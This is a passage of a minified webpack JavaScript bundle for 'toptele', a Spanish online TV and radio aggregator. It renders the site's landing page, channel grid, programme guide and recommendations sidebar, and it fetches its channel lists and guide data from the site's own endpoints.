(this.webpackJsonptdtchannels = this.webpackJsonptdtchannels || []).push([
    [0], {
        112: function(e, a, t) {},
        114: function(e, a) {
            e.exports = function(e) {
                Object.defineProperties(this, {
                    add: {
                        enumerable: !0,
                        writable: !1,
                        value: function() {
                            for (var e in arguments) arguments.hasOwnProperty(e) && a.push(arguments[e]);
                            t || this.stop || !this.autoRun || this.next()
                        }
                    },
                    unshift: {
                        enumerable: !0,
                        writable: !1,
                        value: function() {
                            for (var e in arguments) arguments.hasOwnProperty(e) && a.unshift(arguments[e]);
                            t || this.stop || !this.autoRun || this.next()
                        }
                    },
                    next: {
                        enumerable: !0,
                        writable: !1,
                        value: function() {
                            if (t = !0, a.length < 1 || this.stop) return void(t = !1);
                            a.shift().bind(this)()
                        }
                    },
                    clear: {
                        enumerable: !0,
                        writable: !1,
                        value: function() {
                            return a = []
                        }
                    },
                    contents: {
                        enumerable: !1,
                        get: function() {
                            return a
                        },
                        set: function(e) {
                            return a = e
                        }
                    },
                    autoRun: {
                        enumerable: !0,
                        writable: !0,
                        value: !0
                    },
                    stop: {
                        enumerable: !0,
                        writable: !0,
                        value: !1
                    }
                });
                var a = [],
                    t = !1
            }
        },
        132: function(e, a, t) {
            e.exports = t(184)
        },
        140: function(e, a, t) {},
        146: function(e, a, t) {},
        181: function(e, a, t) {},
        182: function(e, a, t) {},
        184: function(e, a, t) {
            "use strict";
            t.r(a);
            var n = t(0),
                l = t.n(n),
                r = t(15),
                o = t.n(r),
                i = t(74),
                s = (t(139), t(140), t(6)),
                c = t(7),
                m = t(9),
                u = t(8),
                d = t(93),
                p = t(62),
                E = t(64),
                b = t(54),
                h = t(28),
                g = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement(b.a, {
                                style: {
                                    backgroundColor: "rgba(24 32 46)"
                                },
                                variant: "dark",
                                expand: "lg"
                            }, l.a.createElement(b.a.Brand, {
                                href: "/"
                            }, l.a.createElement("img", {
                                src: "".concat("", "/logo_200.png"),
                                height: "35",
                                className: "d-inline-block align-top",
                                style: {
                                    marginTop: "-3px"
                                },
                                alt: "toptele logo"
                            })), l.a.createElement(b.a.Toggle, {
                                "aria-controls": "basic-navbar-nav"
                            }), l.a.createElement(b.a.Collapse, null, l.a.createElement(h.a, {
                                className: "mr-auto",
                                activeKey: window.location.pathname
                            }, l.a.createElement(h.a.Link, {
                                href: "/"
                            }, "TELEVISI\xd3N"), l.a.createElement(h.a.Link, {
                                href: "/radio.html"
                            }, "RADIO"), )), l.a.createElement(b.a.Collapse, {
                                className: "justify-content-end"
                            }, l.a.createElement(h.a, {
                                className: "mr-sm-2"
                            }, l.a.createElement(b.a.Text, null, l.a.createElement("a", {
                                style: {
                                    marginRight: "20px"
                                },
                                href: "https://t.me/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement(p.a, {
                                icon: E.c,
                                size: "lg"
                            })), l.a.createElement("a", {
                                href: "https://twitter.com/",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement(p.a, {
                                icon: E.d,
                                size: "lg"
                            }))))))
                        }
                    }]), t
                }(n.Component),
                f = t(17),
                v = t(225),
                y = t(228),
                w = t(115),
                T = (t(146), function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).state = {}, n
                    }
                    return Object(c.a)(t, [{
                        key: "componentDidMount",
                        value: function() {}
                    }, {
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", null, l.a.createElement("div", {
                                className: "container"
                            }, l.a.createElement(v.a, {
                                container: !0,
                                spacing: 2,
                                justify: "center"
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 11,
                                md: 5
                            }, l.a.createElement("h1", {
                                className: "display-4",
                                style: {
                                    fontSize: "3.5em"
                                }
                            }, "toptele"), l.a.createElement("h2", {
                                className: "display-4 landing-title"
                            }, "Televisión y radio online"), l.a.createElement("h3", {
                                className: "display-4 landing-subtitle"
                            }, "Tu plataforma de TV y Radio online para ver las emisiones online, en abierto y totalmente gratuita!"), l.a.createElement("h3", {
                                className: "display-4 landing-subtitle-2"
                            }, "En este proyecto podr\xe1s disfrutar de una gran cantidad de emisoras de televisi\xf3n y radio, en abierto. Tanto de \xe1mbito nacional, como auton\xf3mico. Contando tambi\xe9n con las principales emisoras internacionales."), l.a.createElement("div", {
                                style: {
                                    paddingTop: "30px",
                                    paddingBottom: "20px"
                                }
                            }, l.a.createElement(y.a, {
                                variant: "outlined",
                                size: "large",
                                href: "".concat("", "/television.html"),
                                style: {
                                    width: "140px",
                                    height: "40px",
                                    marginRight: "15px"
                                }
                            }, "Ver online")))), l.a.createElement(v.a, {
                                container: !0,
                                spacing: 2,
                                justify: "center",
                                className: "separator_1"
                            }, l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                md: 4
                            }, l.a.createElement("h2", {
                                className: "display-4 landing-section"
                            }, "TELEVISI\xd3N + RADIO"), l.a.createElement("p", {
                                className: "display-4 landing-section-2"
                            }, "Encuentra aqu\xed todas las televisiones y radios espa\xf1olas que emiten en abierto v\xeda Internet. Adem\xe1s puedes encontrar canales internacionales de gran audiencia."), l.a.createElement("h2", {
                                className: "display-4 landing-section",
                                style: {
                                    paddingTop: "20px"
                                }
                            }, "COLABORATIVO"), l.a.createElement("p", {
                                className: "display-4 landing-section-2"
                            }, "\xbfQuieres a\xf1adir emisoras, o tienes alguna sugerencia?", " ", l.a.createElement("a", {
                                href: "#"
                            }, "\xa1Puedes!"), " ")), l.a.createElement(v.a, {
                                item: !0,
                                xs: 12,
                                md: 4
                            }, l.a.createElement("h2", {
                                className: "display-4 landing-section"
                            }, "TOTALMENTE GRATUITO"), l.a.createElement("p", {
                                className: "display-4 landing-section-2"
                            }, "Nos gusta ofrecer sencillez y usabilidad al mismo tiempo. Todo ello de forma gratuita! Mas de 1.500 emisoras desde una única web y sin ir de una a otra."), l.a.createElement("h2", {
                                className: "display-4 landing-section",
                                style: {
                                    paddingTop: "20px"
                                }
                            }, "MULTIPLATAFORMA"), l.a.createElement("p", {
                                className: "display-4 landing-section-2"
                            }, "\xbfPorqu\xe9 quedarnos con solo un sistema? Nuestro proyecto es compatible con cualquier reproductor de streaming del mercado.")))))
                        }
                    }]), t
                }(l.a.Component)),
                C = t(58),
                k = t(248),
                O = t(235),
                N = t(243),
                j = t(82),
                x = t.n(j),
                S = function(e) {
                    return l.a.createElement("span", {
                        className: e.className ? e.className : "emoji",
                        role: "img",
                        "aria-label": e.label ? e.label : "",
                        "aria-hidden": e.label ? "false" : "true"
                    }, e.symbol)
                },
                A = t(113),
                P = t.n(A),
                D = t(114),
                L = t.n(D),
                _ = function() {
                    function e() {
                        Object(s.a)(this, e), this.queue = new L.a
                    }
                    return Object(c.a)(e, [{
                        key: "__catchErrorMessage",
                        value: function(e) {
                            if (e.response) {
                                console.log(e.response.status);
                                var a = JSON.parse(e.response.request.response);
                                return console.log(a.error.code + " - " + a.error.message), {
                                    message: {
                                        message: a.error.message,
                                        code: a.error.code
                                    },
                                    status: e.response.status
                                }
                            }
                            e.request ? console.log(e.request) : console.log("Error", e.message)
                        }
                    }, {
                        key: "getFromUrl",
                        value: function(e, a, t, n) {
                            var l = this;
                            this.queue[n ? "unshift" : "add"]((function() {
                                var n = l;
                                P.a.get("".concat(e, "?").concat((new Date).getTime())).then((function(e) {
                                    return n.queue.next(), {
                                        message: e.data,
                                        status: e.status
                                    }
                                })).then(a).catch((function(e) {
                                    return n.queue.next(), l.__catchErrorMessage(e)
                                })).then(t)
                            }))
                        }
                    }]), e
                }(),
                R = {
                    services: {
                        api_tv: {
                            url: "/lists/tv.json"
                        },
                        api_radio: {
                            url: "lists/radio.json"
                        },
                        api_epg: {
                            url: "https://get.toptele.ml/epg.json"
                        }
                    }
                },
                I = new(function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        var e;
                        return Object(s.a)(this, t), (e = a.call(this)).baseEPGUrl = R.services.api_epg.url, e.days = ["Domingo", "Lunes", "Martes", "Mi\xe9rcoles", "Jueves", "Viernes", "S\xe1bado"], e
                    }
                    return Object(c.a)(t, [{
                        key: "getEPG",
                        value: function(e, a, t) {
                            this.getFromUrl(this.baseEPGUrl, (function(e) {
                                e && a(e)
                            }), (function(e) {
                                var a = e;
                                a && (console.log(a), t(a))
                            }), e)
                        }
                    }, {
                        key: "getEventsForOffsetDay",
                        value: function(e, a) {
                            var t = [];
                            if (void 0 !== e)
                                for (var n = Math.floor(Date.now() / 1e3), l = 0; l < e.length; ++l) this.isEventOffset(e[l].start, e[l].end, n, a) && t.push(e[l]);
                            return t
                        }
                    }, {
                        key: "getCurrentEventEPG",
                        value: function(e) {
                            if (void 0 !== e)
                                for (var a = Math.floor(Date.now() / 1e3), t = 0; t < e.length; ++t)
                                    if (this.isEventActual(e[t].start, e[t].end, a)) return e[t]
                        }
                    }, {
                        key: "getFirstDayEvent",
                        value: function(e) {
                            if (void 0 !== e && e.length > 0) {
                                var a = 1 === e.length ? 0 : 1;
                                return this.timestampToDate(e[a].start)
                            }
                        }
                    }, {
                        key: "isEventOffset",
                        value: function(e, a, t, n) {
                            var l = new Date(1e3 * e).getDate(),
                                r = new Date(1e3 * a).getDate(),
                                o = new Date(1e3 * t).getDate();
                            return o + n === l || o + n === r
                        }
                    }, {
                        key: "isEventActual",
                        value: function(e, a, t) {
                            return e <= t && a >= t
                        }
                    }, {
                        key: "timestampToDate",
                        value: function(e) {
                            var a = new Date(1e3 * e),
                                t = a.getDate();
                            return this.days[a.getDay()] + " " + t
                        }
                    }, {
                        key: "timestampToHoursMinutes",
                        value: function(e) {
                            var a = new Date(1e3 * e),
                                t = "0" + a.getHours(),
                                n = "0" + a.getMinutes();
                            return t.substr(-2) + ":" + n.substr(-2)
                        }
                    }]), t
                }(_)),
                M = function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).epgChannelID = e.epgChannelID, n.state = {
                            epgInfo: e.epgInfo
                        }, n
                    }
                    return Object(c.a)(t, [{
                        key: "UNSAFE_componentWillReceiveProps",
                        value: function(e) {
                            e.epgInfo !== this.props.epgInfo && this.setState({
                                epgInfo: e.epgInfo
                            })
                        }
                    }, {
                        key: "render",
                        value: function() {
                            var e = this.state.epgInfo.get(this.epgChannelID),
                                a = void 0;
                            void 0 !== e && (a = I.getCurrentEventEPG(e.events));
                            var t = void 0,
                                n = void 0,
                                r = void 0,
                                o = void 0,
                                i = void 0;
                            return void 0 !== a && (t = a.title, n = a.start, r = a.end, o = a.description, i = a.cover), l.a.createElement("div", {
                                style: {
                                    display: "flex"
                                }
                            }, l.a.createElement("img", {
                                style: {
                                    maxWidth: "100px",
                                    maxHeight: "100%",
                                    marginTop: "10px",
                                    marginBottom: "10px"
                                },
                                src: i,
                                alt: "logo"
                            }), l.a.createElement("div", {
                                style: {
                                    marginLeft: "10px"
                                }
                            }, l.a.createElement("p", {
                                className: "title-epg"
                            }, t), l.a.createElement("i", null, I.timestampToHoursMinutes(n), " -", " ", I.timestampToHoursMinutes(r)), " ", o))
                        }
                    }]), t
                }(l.a.Component);
            M.defaultProps = {
                epgInfo: new Map
            };
            var V = M,
                z = t(86),
                q = t(229),
                G = t(247),
                F = t(230),
                U = t(231),
                B = t(249),
                W = t(186),
                H = Object(q.a)((function(e) {
                    return {
                        paper: {
                            padding: e.spacing(1, 2, 2)
                        },
                        typography: {
                            padding: e.spacing(2)
                        }
                    }
                }));

            function Y(e) {
                var a = H(),
                    t = l.a.useState(!1),
                    n = Object(z.a)(t, 2),
                    r = n[0],
                    o = n[1],
                    i = l.a.useState(null),
                    s = Object(z.a)(i, 2),
                    c = s[0],
                    m = s[1],
                    u = l.a.useState(null),
                    d = Object(z.a)(u, 2),
                    p = d[0],
                    E = d[1],
                    b = function() {
                        E(null), m(null)
                    },
                    h = e.epgInfo.get(e.epgChannelID),
                    g = [],
                    f = [],
                    w = [],
                    T = "",
                    C = "",
                    k = "";
                void 0 !== h && (g = I.getEventsForOffsetDay(h.events, 0), f = I.getEventsForOffsetDay(h.events, 1), w = I.getEventsForOffsetDay(h.events, 2), g.length > 0 && (T = I.getFirstDayEvent(g)), f.length > 0 && (C = I.getFirstDayEvent(f)), w.length > 0 && (k = I.getFirstDayEvent(w)));
                var O = function(e, t) {
                    return l.a.createElement("div", {
                        style: {
                            marginBottom: "2px"
                        },
                        key: e.start
                    }, l.a.createElement("p", {
                        style: {
                            cursor: "pointer",
                            margin: "0px"
                        },
                        onClick: function(a) {
                            return t = a, n = e.start, E(n), void m(t.currentTarget);
                            var t, n
                        }
                    }, l.a.createElement("i", null, I.timestampToHoursMinutes(e.start), " -", " ", I.timestampToHoursMinutes(e.end)), l.a.createElement("br", null), e.title), l.a.createElement(B.a, {
                        open: p === e.start,
                        anchorEl: c,
                        onClose: b,
                        anchorOrigin: {
                            vertical: "bottom",
                            horizontal: "left"
                        },
                        transformOrigin: {
                            vertical: "top",
                            horizontal: "left"
                        },
                        style: {
                            maxWidth: "70%"
                        }
                    }, l.a.createElement(W.a, {
                        className: a.typography
                    }, e.description)))
                };
                return l.a.createElement("div", {
                    style: {
                        marginTop: "10px",
                        minWidth: "120px",
                        marginLeft: "10px",
                        float: "left"
                    }
                }, l.a.createElement(y.a, {
                    variant: "outlined",
                    color: "primary",
                    type: "button",
                    onClick: function() {
                        o(!0)
                    }
                }, "Programaci\xf3n"), l.a.createElement(G.a, {
                    open: r,
                    onClose: function() {
                        o(!1)
                    },
                    scroll: "paper",
                    maxWidth: "md",
                    fullWidth: !0
                }, l.a.createElement(F.a, {
                    id: "max-width-dialog-title"
                }, "Programaci\xf3n"), l.a.createElement(U.a, {
                    style: {
                        marginTop: "-15px"
                    }
                }, l.a.createElement(v.a, {
                    container: !0,
                    justify: "center",
                    spacing: 2
                }, l.a.createElement(v.a, {
                    item: !0,
                    xs: 12,
                    sm: 12,
                    md: 12,
                    lg: 4
                }, l.a.createElement("h5", null, T), void 0 !== g && g.map((function(e, a) {
                    return O(e)
                }))), l.a.createElement(v.a, {
                    item: !0,
                    xs: 12,
                    sm: 12,
                    md: 12,
                    lg: 4
                }, l.a.createElement("h5", null, C), void 0 !== f && f.map((function(e, a) {
                    return O(e)
                }))), l.a.createElement(v.a, {
                    item: !0,
                    xs: 12,
                    sm: 12,
                    md: 12,
                    lg: 4
                }, l.a.createElement("h5", null, k), void 0 !== w && w.map((function(e, a) {
                    return O(e)
                })))))))
            }
            var J = t(244),
                K = t(250),
                Q = t(251),
                X = t(232),
                Z = (t(181), function(e) {
                    var a = e.title,
                        t = e.icon;
                    return l.a.createElement(X.a, {
                        style: {
                            paddingTop: "10px",
                            display: "block"
                        }
                    }, l.a.createElement("h1", {
                        className: "title-text"
                    }, a), t && l.a.createElement(S, {
                        symbol: t,
                        className: "title-icon"
                    }))
                }),
                $ = (t(182), function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t(e) {
                        var n;
                        return Object(s.a)(this, t), (n = a.call(this, e)).handleChangePage = function(e, a) {
                            n.setState({
                                page: a
                            })
                        }, n.dataRows = e.dataRows, n.rowsPerPage = 24, n.state = {
                            dataColumns: e.dataColumns,
                            page: 0,
                            currentFilter: "ALL",
                            currentSearch: ""
                        }, n
                    }
                    return Object(c.a)(t, [{
                        key: "filterSearch",
                        value: function(e) {
                            void 0 !== e && void 0 !== e.target && void 0 !== e.target.value && this.setState({
                                currentSearch: e.target.value
                            })
                        }
                    }, {
                        key: "filterSelect",
                        value: function(e) {
                            void 0 !== e && void 0 !== e.target && void 0 !== e.target.value && this.setState({
                                currentFilter: e.target.value
                            })
                        }
                    }, {
                        key: "accentFold",
                        value: function(e) {
                            return e.replace(/([\xe0\xe1\xe2\xe3\xe4\xe5])|([\xe7\u010d\u0107])|([\xe8\xe9\xea\xeb])|([\xec\xed\xee\xef])|([\xf1])|([\xf2\xf3\xf4\xf5\xf6\xf8])|([\xdf])|([\xf9\xfa\xfb\xfc])|([\xff])|([\xe6])/g, (function(e, a, t, n, l, r, o, i, s, c, m) {
                                return a ? "a" : t ? "c" : n ? "e" : l ? "i" : r ? "n" : o ? "o" : i ? "s" : s ? "u" : c ? "y" : m ? "ae" : void 0
                            }))
                        }
                    }, {
                        key: "reCalculateChannels",
                        value: function() {
                            var e = this,
                                a = this.state.currentSearch,
                                t = this.state.currentFilter,
                                n = this.dataRows;
                            if ("" !== a) {
                                var l = this.accentFold(a).toLowerCase();
                                n = n.filter((function(a) {
                                    return -1 !== e.accentFold(a.name).toLowerCase().indexOf(l)
                                }))
                            }
                            return "ALL" !== t && (n = n.filter((function(e) {
                                return t === e.category
                            }))), n
                        }
                    }, {
                        key: "render",
                        value: function() {
                            var e = this,
                                a = this.state,
                                t = a.dataColumns,
                                n = a.page,
                                r = this.reCalculateChannels();
                            return l.a.createElement("div", {
                                style: {
                                    height: "100%"
                                }
                            }, l.a.createElement(Z, {
                                title: this.props.toolbarTitle,
                                icon: this.props.toolbarIcon
                            }), l.a.createElement(K.a, {
                                id: "outlined-basic",
                                style: {
                                    marginLeft: "7px",
                                    marginBottom: "8px",
                                    width: "95%"
                                },
                                margin: "dense",
                                label: "Buscar",
                                variant: "outlined",
                                onChange: this.filterSearch.bind(this)
                            }), l.a.createElement(O.a, {
                                variant: "outlined",
                                style: {
                                    marginLeft: "7px",
                                    width: "95%"
                                },
                                margin: "dense"
                            }, l.a.createElement(Q.a, null, "Filtro"), l.a.createElement(N.a, {
                                value: this.state.currentFilter,
                                onChange: this.filterSelect.bind(this),
                                label: "Filtro"
                            }, l.a.createElement(k.a, {
                                value: "ALL"
                            }, l.a.createElement("em", null, "Ning\xfan filtro aplicado")), this.props.filterValues.map((function(e, a) {
                                return l.a.createElement(k.a, {
                                    key: a,
                                    value: e
                                }, e)
                            })))), l.a.createElement(J.a, {
                                rowsPerPageOptions: [],
                                component: "div",
                                count: r.length,
                                rowsPerPage: this.rowsPerPage,
                                page: n,
                                onChangePage: this.handleChangePage,
                                labelDisplayedRows: function(e) {
                                    var a = e.from,
                                        t = e.to,
                                        n = e.count;
                                    return "".concat(a, "-").concat(t, " de ").concat(n)
                                },
                                style: {
                                    marginBottom: "5px"
                                }
                            }), l.a.createElement("div", {
                                style: {
                                    textAlign: "center",
                                    display: "flex",
                                    flexWrap: "wrap"
                                }
                            }, r.slice(n * this.rowsPerPage, n * this.rowsPerPage + this.rowsPerPage).map((function(a, n) {
                                var r = l.a.createElement("img", {
                                        className: "logo-canal",
                                        src: a[t[0].id],
                                        alt: "logo"
                                    }),
                                    o = l.a.createElement("p", {
                                        style: {
                                            marginTop: "3px"
                                        }
                                    }, a[t[1].id]);
                                return l.a.createElement("div", {
                                    className: "table-item",
                                    style: {
                                        cursor: "pointer"
                                    },
                                    key: "".concat(n, "#") + a[t[1].id],
                                    onClick: function() {
                                        return e.props.onClickonRow(a)
                                    }
                                }, r, o)
                            }))))
                        }
                    }]), t
                }(l.a.Component));
            $.defaultProps = {
                toolbarIcon: "",
                dataColumns: {},
                dataRows: {},
                onClickonRow: function() {}
            };
            var ee = $,
                ae = new(function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        var e;
                        return Object(s.a)(this, t), (e = a.call(this)).baseTVUrl = R.services.api_tv.url, e.baseRadioUrl = R.services.api_radio.url, e
                    }
                    return Object(c.a)(t, [{
                        key: "getTV",
                        value: function(e, a, t) {
                            this.getFromUrl(this.baseTVUrl, (function(e) {
                                e && a(e)
                            }), (function(e) {
                                var a = e;
                                a && (console.log(a), t(a))
                            }), e)
                        }
                    }, {
                        key: "getRadio",
                        value: function(e, a, t) {
                            this.getFromUrl(this.baseRadioUrl, (function(e) {
                                e && a(e)
                            }), (function(e) {
                                var a = e;
                                a && (console.log(a), t(a))
                            }), e)
                        }
                    }]), t
                }(_)),
                te = function e() {
                    var a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "NoChannel",
                        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "http://www.tdtchannels.com",
                        n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "https://i.pinimg.com/736x/7c/1c/a4/7c1ca448be31c489fb66214ea3ae6deb.jpg",
                        l = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "",
                        r = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {},
                        o = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : void 0,
                        i = arguments.length > 6 && void 0 !== arguments[6] && arguments[6];
                    Object(s.a)(this, e), this.name = a, this.web = t, this.logo = n, this.category = l, this.options = r, this.epg = o, this.cors = i
                },
                ne = function e() {
                    var a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "Noformat",
                        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "http://www.tdtchannels.com",
                        n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
                        l = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "",
                        r = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : "",
                        o = !(arguments.length > 5 && void 0 !== arguments[5]) || arguments[5];
                    Object(s.a)(this, e), this.format = a, this.url = t, this.geo = n, this.res = l, this.lang = r, this.embed = o
                },
                le = function e() {
                    var a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0,
                        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
                        n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
                        l = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "",
                        r = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : "";
                    Object(s.a)(this, e), this.start = a, this.end = t, this.title = n, this.description = l, this.cover = r
                },
                re = function e() {
                    var a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "id",
                        t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                    Object(s.a)(this, e), this.id = a, this.events = t
                },
                oe = function(e, a, t) {
                    i.a.event({
                        category: e,
                        action: a,
                        label: t
                    })
                },
                ie = (t(91), function(e) {
                    Object(m.a)(t, e);
                    var a = Object(u.a)(t);

                    function t() {
                        return Object(s.a)(this, t), a.apply(this, arguments)
                    }
                    return Object(c.a)(t, [{
                        key: "render",
                        value: function() {
                            return l.a.createElement("div", {
                                className: "right-separator",
                                style: {
                                    height: "100%",
                                    paddingLeft: "10px"
                                }
                            }, l.a.createElement("h2", {
                                style: {
                                    fontSize: "1.5em",
                                    fontWeight: "350",
                                    paddingTop: "10px"
                                }
                            }, "Recomendaciones"), l.a.createElement("div", {
                                className: "recomendation-div"
                            }, l.a.createElement("a", {
                                className: "card-text",
                                href: "https://soporte.toptele.ml/reportar",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement("div", {
                                className: "shadow-sm p-2 mb-3 bg-white rounded",
                                style: {
                                    display: "flex"
                                }
                            }, l.a.createElement("img", {
                                alt: "Reportar canal caído",
                                src: "https://i.imgur.com/euKaZpD.png",
                                height: "75",
                                style: {
                                    marginRight: "10px"
                                }
                            }), l.a.createElement("p", {
                                style: {
                                    marginTop: "25px"
                                }
                            }, "Reportar canal caído"))), l.a.createElement("a", {
                                className: "card-text",
                                href: "https://soporte.toptele.ml/solicitar",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement("div", {
                                className: "shadow-sm p-2 mb-3 bg-white rounded",
                                style: {
                                    display: "flex"
                                }
                            }, l.a.createElement("img", {
                                alt: "Solicitar Emisión",
                                src: "https://i.imgur.com/bRKKPH9.png",
                                height: "75",
                                style: {
                                    marginRight: "10px"
                                }
                            }), l.a.createElement("p", {
                                style: {
                                    marginTop: "25px"
                                }
                            }, "Solicitar Emisión"))), l.a.createElement("a", {
                                className: "card-text",
                                href: "#",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement("div", {
                                className: "shadow-sm p-2 mb-3 bg-white rounded",
                                style: {
                                    display: "flex"
                                }
                            }, l.a.createElement("img", {
                                alt: "Guardanos en favoritos",
                                src: "https://i.imgur.com/wCFoWUv.png",
                                height: "75",
                                style: {
                                    marginRight: "10px"
                                }
                            }), l.a.createElement("p", {
                                style: {
                                    marginTop: "25px"
                                }
                            }, "Guardanos en favoritos"))), l.a.createElement("a", {
                                className: "card-text",
                                href: "https://hola.org/download",
                                target: "_blank",
                                rel: "nofollow noopener noreferrer"
                            }, l.a.createElement("div", {
                                className: "shadow-sm p-2 mb-3 bg-white rounded",
                                style: {
                                    display: "flex"
                                }
                            }, l.a.createElement("img", {
                                alt: "VPN canales GEO",
                                src: "https://i.imgur.com/gmbGitL.png",
                                height: "75",
                                style: {
                                    marginLeft: "5px",
                                    marginRight: "10px"
                                }
                            }), l.a.createElement("p", {
                                style: {
                                    marginTop: "25px"
                                }
                            }, "VPN Gratuita")))))
                        }
                    }]), t
                }(n.Component));
            var se = function(e) {
                Object(m.a)(t, e);
                var a = Object(u.a)(t);

                function t(e) {
                    var n;
                    return Object(s.a)(this, t), (n = a.call(this, e)).randomIDToForceRefresh = 0, n.state = {
                        entries: [],
                        entriesRows: [],
                        filterValues: ["Todos"],
                        selectedChannel: void 0,
                        selectedOptionN: -1,
                        playerError: !1,
                        epgInfo: new Map
                    }, n.divPlayer = l.a.createRef(), n.onClickonOption = n.onClickonOption.bind(Object(C.a)(n)), n
                }
                return Object(c.a)(t, [{
                    key: "componentDidMount",
                    value: function() {
                        var e = this;
                        I.getEPG(!1, (function(a) {
                            for (var t = new Map, n = a.message, l = 0; l < n.length; ++l) {
                                for (var r = n[l], o = [], i = r.name, s = r.events, c = 0; c < s.length; ++c) {
                                    var m = s[c],
                                        u = m.hi,
                                        d = m.hf,
                                        p = m.t,
                                        E = m.d,
                                        b = m.c;
                                    o.push(new le(u, d, p, E, b))
                                }
                                t.set(i, new re(i, o))
                            }
                            e.setState({
                                epgInfo: t
                            })
                        })), ae.getTV(!1, (function(a) {
                            for (var t = [], n = [], l = a.message.countries, r = 0; r < l.length; ++r)
                                for (var o = l[r].ambits, i = 0; i < o.length; ++i) {
                                    var s = o[i],
                                        c = s.channels;
                                    n.push(s.name);
                                    for (var m = 0; m < c.length; ++m) {
                                        for (var u = c[m], d = u.options, p = [], E = 0; E < d.length; ++E) {
                                            var b = d[E];
                                            "W3U" !== b.format && p.push(new ne(b.format, b.url, b.geo2, b.res, b.lang, u.extra_info.includes("EMB")))
                                        }
                                        t.push(new te(u.name, u.web, u.logo, s.name, p, u.epg_id, u.extra_info.includes("NONAV")))
                                    }
                                }
                            var h = t.map((function(e) {
                                return a = e.logo, t = e.name, n = e.category, {
                                    logo: a,
                                    name: t,
                                    category: n
                                };
                                var a, t, n
                            }));
                            e.setState({
                                entries: t,
                                entriesRows: h,
                                filterValues: n
                            });
                            var g = window.location.href.split("/");
                            if (g.length > 4 && "" !== g[4]) {
                                var f = g[4];
                                for (r = 0; r < e.state.entriesRows.length; r++)
                                    if (decodeURIComponent(f) === e.state.entriesRows[r].name.replace(/\s/g, "")) {
                                        e.onClickonRow(e.state.entriesRows[r]);
                                        break
                                    }
                            }
                        }))
                    }
                }, {
                    key: "onClickonRow",
                    value: function(e) {
                        for (var a, t = 0; t < this.state.entries.length; ++t)
                            if (this.state.entries[t].name === e.name) {
                                a = this.state.entries[t];
                                break
                            } this.setState({
                            selectedChannel: a,
                            playerError: !1
                        }), a.cors || 0 === a.options.length ? (window.open(a.web), this.setState({
                            selectedOptionN: -1,
                            playerError: !0
                        }), oe("CLICK_TV", a.name, "")) : a.options.length > 0 && (window.scrollTo(0, this.divPlayer.current.offsetTop), this.setState({
                            selectedOptionN: 0
                        }), oe("CLICK_TV", a.name, a.options[0].url)), this.props.history.push("#" + a.name.replace(/\s/g, "")),
                        ((navigator.userAgent.search("Safari") >= 0 && navigator.userAgent.search("Chrome") < 0) || (/iPad|iPhone|iPod/.test(navigatorID.platform))) && a.options[0].url == "https://get.toptele.ml/l/" + a.name.toLowerCase() ? (window.open(a.options[0].url), this.setState({
                            selectedOptionN: -1,
                            playerError: !0
                        }), oe("CLICK_TV", a.name, "")) : a.options.length > 0 && (window.scrollTo(0, this.divPlayer.current.offsetTop), this.setState({
                            selectedOptionN: 0
                        }), oe("CLICK_TV", a.name, a.options[0].url)), this.props.history.push("#" + a.name.replace(/\s/g, ""))
                    }
                }, {
                    key: "onClickonOption",
                    value: function(e) {
                        oe("CLICK_TV", this.state.selectedChannel.name + " - OPTION" + e.target.value, this.state.selectedChannel.options[e.target.value].url), this.setState({
                            selectedOptionN: e.target.value,
                            playerError: !1
                        })
                    }
                }, {
                    key: "onPlayerError",
                    value: function(e, a) {
                        console.log(e, a), void 0 !== a && void 0 !== a.type && void 0 !== a.details && "mediaError" !== a.type && "bufferStalledError" !== a.details && this.setState({
                            playerError: !0
                        })
                    }
                }, {
                    key: "renderErrorMessage",
                    value: function(e, a) {
                        var t = "",
                            n = "";
                        return void 0 !== a && null !== a.geo && (n = "Adem\xe1s se trata de una emisi\xf3n geolocalizada, es posible que est\xe9s fuera de la geolocalizaci\xf3n permitida. Prueba desde una conexion VPN."), t = e.cors || e.options.length <= 1 ? "No nos permiten reproducir este canal en la plataforma web. Puedes reproducirlo desde la ventana abierta." : "Puedes reproducirlo mediante otra emisi\xf3n o desde la ventana abierta.", l.a.createElement("div", {
                            style: {
                                maxWidth: "450px",
